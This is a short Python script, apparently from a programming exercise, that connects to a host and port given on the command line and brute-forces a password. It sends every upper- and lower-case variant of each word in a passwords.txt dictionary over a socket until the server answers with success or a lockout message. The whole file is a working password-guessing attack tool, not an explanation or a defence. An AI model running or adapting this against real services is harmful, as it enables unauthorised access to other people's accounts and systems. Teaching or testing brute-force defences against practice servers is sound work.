import sys
import socket


args = sys.argv
hostname = args[1]
port = int(args[2])

client_socket = socket.socket()
address = (hostname, port)
client_socket.connect(address)


def find_pass():
    with open('passwords.txt', 'r') as file:
        for line in file:
            line = line.rstrip("\n").lower()
            line_upper = line.upper()
            for i in range(2 ** len(line)):
                s = bin(i).lstrip("0b")
                if len(s) < len(line):
                    s = "0" * (len(line) - len(s)) + s

                password = ""
                for j in range(len(line)):
                    if s[j] == "0":
                        password += line[j]
                    else:
                        password += line_upper[j]

                data = password.encode()
                client_socket.send(data)
                response = client_socket.recv(1024)
                response = response.decode()
                if response == "Wrong password!":
                    continue
                elif response == "Connection success!":
                    return password
                elif response == "Too many attempts":
                    return


result = find_pass()
client_socket.close()

if result:
    print(result)
